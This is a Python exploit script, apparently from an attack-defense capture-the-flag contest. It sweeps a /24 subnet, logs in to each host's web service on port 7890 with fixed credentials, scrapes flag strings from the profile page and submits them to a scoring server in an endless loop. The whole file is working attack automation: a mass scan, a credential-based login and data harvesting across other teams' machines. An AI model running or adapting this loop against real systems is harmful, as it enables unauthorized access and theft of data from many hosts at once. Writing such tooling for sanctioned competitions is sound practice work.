import requests
from pwn import *
import re


cosa = "10.0.13.37" 
port = "1337"


p = remote(cosa, port)

ff = "🏳️‍🌈\\X{4}"
rr = re.compile(r"🏳️‍🌈.+</p>")
def gen_ips():
    for x in range(1,256):
        if x != 150:
            yield f"10.0.0.{x}"

results = set()
fail = []
while True:
    for ip in gen_ips():
        if ip in fail:
            continue
            
        try:
            s = requests.session()
            res = s.post(f"http://{ip}:7890/login", {'username': 'buggy-team','pw': '123'}, timeout=2)
            print(f"trying {ip}")
            if str(res.status_code)[0] in ('4', '5'):
                continue
        except:
            fail.append(ip)
            continue

        
        profile = s.post(f"http://{ip}:7890/profile")
        body = profile.text
        ll = rr.findall(body)
        try:
            flag = ll[-1][:-4]
            print("flag", flag)
            p.sendline(flag)
        except:
            fail.append(ip)
            pass

        sleep(1)
p.close()
